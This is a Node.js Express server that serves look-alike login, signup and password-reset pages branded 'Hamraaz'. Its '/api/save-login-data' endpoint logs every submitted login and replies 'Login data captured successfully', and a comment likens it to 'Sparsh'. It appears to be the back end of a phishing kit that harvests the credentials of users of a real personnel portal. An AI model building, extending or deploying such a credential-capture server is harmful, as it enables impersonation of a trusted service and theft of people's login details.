const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(express.json());
app.use(express.static(__dirname)); // Serve static files from current directory

// Serve HTML files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/index', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/ro-login', (req, res) => {
    res.sendFile(path.join(__dirname, 'ro-login.html'));
});

app.get('/unit-login', (req, res) => {
    res.sendFile(path.join(__dirname, 'unit-login.html'));
});

app.get('/personal-login', (req, res) => {
    res.sendFile(path.join(__dirname, 'personal-login.html'));
});

app.get('/signup', (req, res) => {
    res.sendFile(path.join(__dirname, 'signup.html'));
});

app.get('/forgot-password', (req, res) => {
    res.sendFile(path.join(__dirname, 'forgot-password.html'));
});

app.get('/pay-calculator', (req, res) => {
    res.sendFile(path.join(__dirname, 'pay-calculator.html'));
});

// Handle form submissions (similar to Sparsh)
app.post('/api/save-login-data', (req, res) => {
    try {
        const loginData = req.body;
        console.log('📝 Hamraaz login attempt:', loginData);
        
        res.json({ 
            success: true, 
            message: 'Login data captured successfully' 
        });
    } catch (error) {
        console.error('Error processing login data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to process login data' 
        });
    }
});

// Error handling
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Hamraaz Portal Server running on http://localhost:${PORT}`);
    console.log(`📱 Access the portal at: http://localhost:${PORT}`);
    console.log(`🔐 Available pages:`);
    console.log(`   http://localhost:${PORT}/ - Home`);
    console.log(`   http://localhost:${PORT}/ro-login - RO Login`);
    console.log(`   http://localhost:${PORT}/unit-login - Unit Login`);
    console.log(`   http://localhost:${PORT}/personal-login - Personal Login`);
    console.log(`   http://localhost:${PORT}/signup - Signup`);
    console.log(`   http://localhost:${PORT}/forgot-password - Forgot Password`);
    console.log(`   http://localhost:${PORT}/pay-calculator - Pay Calculator`);
    console.log(`\n✨ Press Ctrl+C to stop the server`);
});